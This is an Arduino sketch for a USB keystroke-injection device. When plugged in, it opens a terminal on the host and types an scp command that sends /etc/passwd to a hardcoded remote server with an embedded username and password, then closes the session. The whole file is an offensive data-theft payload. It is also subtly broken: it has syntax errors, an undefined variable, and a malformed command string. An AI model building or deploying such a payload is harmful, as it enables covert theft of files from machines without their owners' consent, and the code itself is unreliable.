#include <Keyboard.h>

// set variables for server connection
const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* server_path = "/home/ubuntu";
const char* server_ip = "192.168.1.112";

void setup() {

  Keyboard.begin(); //start keyboard communication 

  String path = "/etc/passwd"

    delay(600);
    Keyboard.press(KEY_LEFT_CTRL);
    delay(600);
    Keyboard.press(KEY_LEFT_ALT);
    delay(600);
    Keyboard.press('t');
    delay(6000);
    Keyboard.release(KEY_LEFT_CTRL);
    Keyboard.release(KEY_LEFT_ALT);
    Keyboard.release('t');
    Keyboard.println("scp" + path + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
    Keyboard.println(copyCommand);
    delay(600);
    Keyboard.println(server_password);
    delay(600);
    Keyboard.println("exit");
    delay(600);
    Keyboard.end();
}

void loop() {}
